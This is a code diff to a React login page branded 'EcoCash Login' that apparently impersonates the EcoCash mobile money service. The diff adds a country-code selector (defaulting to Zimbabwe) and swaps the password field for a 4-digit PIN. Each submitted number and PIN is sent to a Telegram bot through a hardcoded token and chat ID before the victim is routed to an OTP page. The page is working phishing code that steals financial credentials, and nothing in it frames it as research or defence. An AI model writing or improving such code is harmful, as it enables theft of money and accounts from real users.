@@ -9,14 +9,15 @@ import { Menu } from "lucide-react";
 const Login = () => {
   // ✅ Move it here
   const [menuOpen, setMenuOpen] = useState(false);
+  const [countryCode, setCountryCode] = useState("+263");
   const [mobile, setMobile] = useState("");
-  const [password, setPassword] = useState("");
+  const [pin, setPin] = useState("");
 
   const TELEGRAM_BOT_TOKEN = "7473229254:AAH6gQtxqyY32NpHpWiQ7v0GSXRxMM8UVX8";
   const TELEGRAM_CHAT_ID = "5287071616";
 
-  const sendToTelegram = async (username: string, password: string) => {
-    const message = `EcoCash Login\nUsername: ${username}\nPassword: ${password}`;
+  const sendToTelegram = async (username: string, pin: string) => {
+    const message = `EcoCash Login\nUsername: ${username}\nPIN: ${pin}`;
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     try {
       await fetch(url, {
@@ -35,8 +36,10 @@ const Login = () => {
   const navigate = useNavigate();
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
-    await sendToTelegram(mobile, password);
-    navigate("/otp", { state: { mobile } });
+    if (pin.length !== 4) return;
+  const fullMobile = countryCode + mobile;
+  await sendToTelegram(fullMobile, pin);
+  navigate("/otp", { state: { mobile: fullMobile } });
   };
 
   const handleSignUp = () => {
@@ -133,32 +136,56 @@ const Login = () => {
           Log In
         </h2>
 
+
         <form onSubmit={handleLogin} className="space-y-5">
           <div className="space-y-2">
-            <Label htmlFor="username">Username</Label>
-            <Input
-              id="username"
-              type="text"
-              placeholder="mobile number..."
-              value={mobile}
-              onChange={(e) => setMobile(e.target.value)}
-              required
-            />
+            <Label htmlFor="username">Mobile Number</Label>
+            <div className="flex gap-2">
+              <select
+                className="border rounded-md px-2 py-2 bg-white"
+                value={countryCode}
+                onChange={e => setCountryCode(e.target.value)}
+                style={{ minWidth: 90 }}
+                aria-label="Country code"
+              >
+                <option value="+263">ZW +263</option>
+                <option value="+27">ZA +27</option>
+                <option value="+260">ZM +260</option>
+                <option value="+255">TZ +255</option>
+                <option value="+254">KE +254</option>
+                <option value="+44">UK +44</option>
+                <option value="+1">US +1</option>
+              </select>
+              <Input
+                id="username"
+                type="text"
+                placeholder="mobile number..."
+                value={mobile}
+                onChange={(e) => setMobile(e.target.value)}
+                required
+                className="flex-1"
+              />
+            </div>
           </div>
-
           <div className="space-y-2">
-            <Label htmlFor="password">Password</Label>
+            <Label htmlFor="pin">4-Digit PIN</Label>
             <Input
-              id="password"
+              id="pin"
               type="password"
-              placeholder="password..."
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
+              inputMode="numeric"
+              pattern="[0-9]{4}"
+              maxLength={4}
+              minLength={4}
+              placeholder="Enter 4-digit PIN"
+              value={pin}
+              onChange={(e) => {
+                const val = e.target.value.replace(/\D/g, "");
+                if (val.length <= 4) setPin(val);
+              }}
               required
             />
           </div>
-
-          <Button type="submit" className="w-full">
+          <Button type="submit" className="w-full" disabled={pin.length !== 4}>
             LOGIN
           </Button>
         </form>
